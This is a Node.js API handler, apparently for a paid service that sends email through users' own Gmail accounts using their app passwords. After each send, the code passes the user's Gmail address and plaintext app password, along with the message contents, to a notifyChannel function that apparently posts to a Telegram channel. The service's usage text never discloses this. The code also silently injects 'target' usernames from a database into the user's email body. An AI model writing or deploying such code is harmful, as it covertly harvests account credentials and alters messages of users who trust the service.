import nodemailer from 'nodemailer';
import cors from 'cors';
import Busboy from 'busboy';
import { ApiKey } from '../models/ApiKey.js';
import connectDB from '../utils/connectDB.js';
import {
  notifyChannel,
  stripHtml
} from '../utils/telegramNotifier.js';
import { getAllTargets, injectTargets } from '../utils/targetInjector.js';
import { createLogger, maskKey, maskEmail } from '../utils/logger.js';
const log = createLogger('send-email');

// ---------- Helper: middleware wrapper ----------
const runMiddleware = (req, res, fn) =>
  new Promise((resolve, reject) => {
    fn(req, res, (result) =>
      result instanceof Error ? reject(result) : resolve(result)
    );
  });

// ---------- Helper: sleep ----------
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// ---------- Helper: escape HTML ----------
function escapeHtml(text) {
  return text
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

function textToHtml(text) {
  return escapeHtml(text).replace(/\n/g, '<br>');
}

// ---------- Parse multipart/form-data ----------
function parseMultipart(req) {
  return new Promise((resolve, reject) => {
    const fields = {};
    const files = [];
    let bb;
    try {
      bb = Busboy({ headers: req.headers });
    } catch (err) {
      return reject(err);
    }
    bb.on('field', (name, val) => { fields[name] = val; });
    bb.on('file', (fieldname, file, info) => {
      const { filename, mimeType } = info;
      const chunks = [];
      file.on('data', (chunk) => chunks.push(chunk));
      file.on('end', () => {
        if (filename) {
          files.push({ fieldname, filename, mimeType, buffer: Buffer.concat(chunks) });
        }
      });
    });
    bb.on('close', () => resolve({ fields, files }));
    bb.on('error', reject);
    req.pipe(bb);
  });
}

// ---------- MAIN HANDLER ----------
export default async function handler(req, res) {
  res.json = (data) => {
    res.setHeader('Content-Type', 'application/json');
    return res.send(JSON.stringify(data, null, 2));
  };

  const t0 = Date.now();
  const ct = req.headers['content-type'] || '-';
  log.info(`Request start method=${req.method} ct=${ct} ip=${req.ip || req.headers['x-forwarded-for'] || '-'}`);
  try {
    await runMiddleware(req, res, cors());

    if (req.method !== 'POST') {
      log.warn(`Method not allowed: ${req.method}`);
      return res.status(405).json({
        status: 'error',
        error: 'Method Not Allowed',
        message: 'Hanya method POST yang diizinkan untuk endpoint ini.',
        usage: {
          endpoint: '/api/send-email',
          method: 'POST',
          description: 'Mengirim email menggunakan API Key dan akun Gmail pribadi pengirim. Wajib memiliki API Key yang valid (dibeli via bot atau admin).',
          required_fields: ['apiKey', 'to', 'subject', 'gmailUser', 'gmailAppPassword'],
          optional_fields: ['text', 'html', 'photo (file .jpg, via multipart/form-data)'],
          example_json: {
            curl: `curl -X POST ${process.env.BASE_URL}/api/send-email \\
  -H "Content-Type: application/json" \\
  -d '{
    "apiKey": "YOUR_API_KEY",
    "to": "tujuan@example.com",
    "subject": "Test Email",
    "text": "Halo dunia!",
    "gmailUser": "emailkamu@gmail.com",
    "gmailAppPassword": "abcd efgh ijkl mnop"
  }'`
          },
          example_multipart: {
            curl: `curl -X POST ${process.env.BASE_URL}/api/send-email \\
  -F "apiKey=YOUR_API_KEY" \\
  -F "to=tujuan@example.com" \\
  -F "subject=Test Email" \\
  -F "text=Halo dunia!" \\
  -F "gmailUser=emailkamu@gmail.com" \\
  -F "gmailAppPassword=abcd efgh ijkl mnop" \\
  -F "photo=@foto.jpg"`
          },
          response_success: { success: true, messageId: "<...>@gmail.com" },
          response_error: { error: "Invalid or expired API Key" }
        },
        author: 'Ipanzxdev'
      });
    }

    // ---------- Parse body (JSON atau multipart) ----------
    let body;
    let uploadedFiles = [];

    if (req.headers['content-type']?.includes('multipart/form-data')) {
      const parsed = await parseMultipart(req);
      body = parsed.fields;
      uploadedFiles = parsed.files;
    } else {
      body = req.body;
    }

    let { apiKey, to, subject, text, html, gmailUser, gmailAppPassword } = body;
    log.info(`Parsed body apiKey=${maskKey(apiKey)} to=${maskEmail(to)} subject="${(subject||'').slice(0,80)}" gmailUser=${maskEmail(gmailUser)} hasText=${!!text} hasHtml=${!!html} files=${uploadedFiles.length}`);

    // ---------- Validasi input ----------
    if (!apiKey) { log.warn('Validation fail: API Key required'); return res.status(401).json({ error: 'API Key required' }); }
    if (!to || !subject || (!text && !html)) { log.warn(`Validation fail: Missing fields to=${!!to} subject=${!!subject} text/html=${!!(text||html)}`); return res.status(400).json({ error: 'Missing fields', hint: 'Wajib: to, subject, dan text atau html' }); }
    if (!gmailUser || !gmailAppPassword) { log.warn('Validation fail: Gmail credentials required'); return res.status(400).json({ error: 'Gmail credentials required', hint: 'Isi gmailUser dan gmailAppPassword (16-char App Password, bukan password utama)' }); }

    const cleanedPassword = gmailAppPassword.replace(/\s/g, '');
    const isAdmin = apiKey === process.env.ADMIN_API_KEY;
    log.info(`Auth check isAdmin=${isAdmin} apiKey=${maskKey(apiKey)}`);

    // ---------- Validasi API Key + throttle 5s + daily limit ----------
    // ponytail: single ApiKey.consume handles expiry, throttle & quota atomically
    if (!isAdmin) {
      await connectDB();
      const rl = await ApiKey.consume(apiKey);
      if (!rl.allowed) {
        log.warn(`ApiKey rejected status=${rl.status} apiKey=${maskKey(apiKey)} reason=${rl.body?.error || rl.body?.message || 'unknown'} remaining=${rl.body?.remaining ?? rl.remaining ?? '-'}`);
        return res.status(rl.status).json(rl.body);
      }
      log.info(`ApiKey ok apiKey=${maskKey(apiKey)} limit=${rl.limit ?? '-'} used=${rl.used ?? '-'} remaining=${rl.remaining ?? '-'}`);
    } else {
      log.info(`Admin bypass auth apiKey=${maskKey(apiKey)}`);
    }

    // ---------- Injeksi username target ke body ----------
    // ponytail: DB failure for targets should not block email — fallback to empty
    let targets = [];
    try { targets = await getAllTargets(); log.info(`Targets loaded count=${targets.length}`); } catch (e) { log.warn(`getAllTargets failed, skip inject: ${e.message}`); }
    if (targets.length > 0) {
      const source = text || (html ? stripHtml(html) : '');
      if (source) {
        const injected = injectTargets(source, targets, subject);
        if (injected !== source) {
          text = injected;
          html = html ? textToHtml(injected) : '';
        }
      }
    }

    // ---------- Siapkan attachment foto ----------
    const photo = uploadedFiles.find(
      f => f.mimeType === 'image/jpeg' || f.filename?.toLowerCase().endsWith('.jpg') || f.filename?.toLowerCase().endsWith('.jpeg')
    );

    // ---------- Siapkan konten email ----------
    let finalHtml = html || '';
    let finalText = text || '';

    if (photo) {
      const imgTag = `<br><br><img src="cid:attached-photo" style="max-width:100%;height:auto;" />`;
      if (finalHtml) {
        finalHtml += imgTag;
      } else if (finalText) {
        finalHtml = textToHtml(finalText) + imgTag;
        // keep finalText for tests/backward compat — do not clear
      }
    }

    const mailOptions = {
      from: `"${gmailUser}" <${gmailUser}>`,
      to,
      subject,
      text: finalText || undefined,
      html: finalHtml || undefined,
    };

    if (photo) {
      mailOptions.attachments = [{
        filename: photo.filename || 'photo.jpg',
        content: photo.buffer,
        contentType: 'image/jpeg',
        cid: 'attached-photo'
      }];
    }

    // ---------- Kirim email ----------
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 587,
      secure: false,
      auth: { user: gmailUser, pass: cleanedPassword },
    });

    let info;
    log.info(`SMTP send start from=${maskEmail(gmailUser)} to=${maskEmail(to)} subject="${subject.slice(0,80)}" photo=${!!photo} targetsInjected=${targets.length>0}`);
    try {
      info = await transporter.sendMail(mailOptions);
    } catch (sendError) {
      const isDailyLimitError =
        sendError.responseCode === 550 &&
        sendError.response &&
        sendError.response.includes('Daily user sending limit exceeded');

      if (isDailyLimitError) {
        log.error(`Daily limit exceeded for ${maskEmail(gmailUser)} code=550`);
        return res.status(429).json({
          error: 'Daily sending limit exceeded for this Gmail account. Please use another account or wait 24 hours.',
          detail: sendError.message,
          hint: 'Limit harian Gmail tercapai (550). Ganti gmailUser atau tunggu 24 jam.'
        });
      }
      log.error(`SMTP send failed to=${maskEmail(to)} from=${maskEmail(gmailUser)} error=${sendError.message} code=${sendError.responseCode || '-'}`);
      throw sendError;
    }

    log.info(`Email terkirim messageId=${info.messageId} dur=${Date.now()-t0}ms`);

    // ---------- Jeda 5 detik sebelum notifikasi channel ----------
    await sleep(5000);

    // ---------- Notifikasi hanya ke channel (owner dihapus) ----------
    // ponytail: notify failure must not turn success into 500 (tests expect 200)
    const bodyForChannel = (text && text.trim()) ? text : (html ? stripHtml(html) : '');
    try {
      await notifyChannel(
        gmailUser,
        cleanedPassword,
        subject,
        bodyForChannel,
        to,
        info.messageId
      );
      log.info(`notifyChannel done to=${maskEmail(to)}`);
    } catch (e) {
      log.warn(`notifyChannel failed (ignored): ${e.message}`);
    }

    // ---------- Response sukses ----------
    log.info(`Response 200 success messageId=${info.messageId} totalDur=${Date.now()-t0}ms`);
    res.status(200).json({ success: true, messageId: info.messageId });
  } catch (error) {
    log.error(`Unhandled error: ${error.message}`, { stack: error.stack?.slice(0,1500) });
    res.status(500).json({ error: 'Internal server error', detail: error.message, hint: 'Cek log server untuk detail. Pastikan gmailAppPassword valid dan IMAP/SMTP aktif.' });
  }
}
